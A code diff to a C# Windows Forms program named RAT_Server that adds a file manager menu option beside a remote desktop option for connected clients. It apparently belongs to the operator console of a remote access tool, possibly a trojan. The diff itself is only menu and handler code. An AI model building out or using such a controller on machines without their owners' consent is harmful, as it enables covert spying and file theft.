@@ -30,8 +30,12 @@ namespace RAT_Server
             var menuRemoteDesktop = new ToolStripMenuItem("Ver Escritorio Remoto");
             menuRemoteDesktop.Click += menuRemoteDesktop_Click;
 
+            var menuFileManager = new ToolStripMenuItem("Administrador de Archivos");
+            menuFileManager.Click += menuFileManager_Click;
+
             // Puedes agregar más opciones al menú aquí
             contextMenu.Items.Add(menuRemoteDesktop);
+            contextMenu.Items.Add(menuFileManager);
         }
 
         private void ServerForm_Load(object sender, EventArgs e)
@@ -238,6 +242,24 @@ namespace RAT_Server
                     TcpClient client = connectedClients[clientName];
                     var remoteDesktopForm = new RemoteDesktopForm(client);
                     remoteDesktopForm.Show();
+                }
+                else
+                {
+                    MessageBox.Show("El cliente ya no está conectado.");
+                }
+            }
+        }
+
+        private void menuFileManager_Click(object sender, EventArgs e)
+        {
+            if (listViewClients.SelectedItems.Count > 0)
+            {
+                string clientName = listViewClients.SelectedItems[0].Text;
+                if (connectedClients.ContainsKey(clientName))
+                {
+                    TcpClient client = connectedClients[clientName];
+                    var fm = new FileManagerForm(client);
+                    fm.Show();
                 }
                 else
                 {
